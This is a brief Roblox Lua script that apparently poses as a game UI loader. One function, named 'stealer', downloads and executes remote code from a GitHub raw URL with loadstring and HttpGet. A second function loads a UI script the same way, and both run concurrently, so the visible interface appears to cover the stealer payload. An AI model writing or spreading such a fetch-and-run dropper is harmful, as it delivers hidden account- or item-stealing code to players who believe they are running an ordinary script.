local function stealer()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratIeahh/Summer-UPD/refs/heads/main/Initializer.lua"))()
    end
    local function loadui()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratIeahh/Summer-UPD/refs/heads/main/1"))()
        end

        task.spawn(stealer)
        task.spawn(loadui)
